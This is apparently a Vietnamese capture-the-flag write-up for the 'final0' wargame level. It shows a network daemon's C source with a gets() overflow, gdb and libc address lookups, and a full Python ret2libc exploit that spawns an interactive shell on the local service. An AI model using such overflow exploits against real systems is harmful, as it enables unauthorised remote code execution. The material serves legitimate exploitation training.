# Final zero
source code:
```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```
Mục tiêu của chúng ta trong bài này là chạy lệnh "execve("/bin/sh",0,0).

## debug
>  gdb -p `pidof final0`
> set follow-fork-mode child
> (gdb) info functions @plt

![Alt text](image.png)
ta cũng có thể tìm địa chỉ của "/bin/sh" ở bên trong libc.so.6 với
```bash
grep -R -a -b -o /bin/sh /lib/libc.so.6
```
và nhận được libc đang ở 1176511
tiếp theo tìm địa chỉ của libc với
```bash
pidof final0
1697
cat /proc/1697/maps  
```


## Ta có chương trình exploit
```py
import socket
import struct
import telnetlib
HOST = "127.0.0.1"
PORT = 2995


padding = "a"*510 + "\x00"+"aaaabbbbccccddddeeeef"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
execve = struct.pack("I", 0x08048c0c )
binsh = struct.pack("I", 1176511+0xb7e97000)
# AAAA là ret cua execve do chung ta khong can ham nay tra ve bat ki dau ca, chi don gian la goi execve("/bin/sh",0,0) thoi.
exploit = padding + execve + "AAAA" + binsh +"\x00" *8

s.send(exploit + "\n")
s.send("id\n")
s.send("uname -a \n")
print s.recv(1024)
t = telnetlib.Telnet()
t.sock=s
t.interact()
```

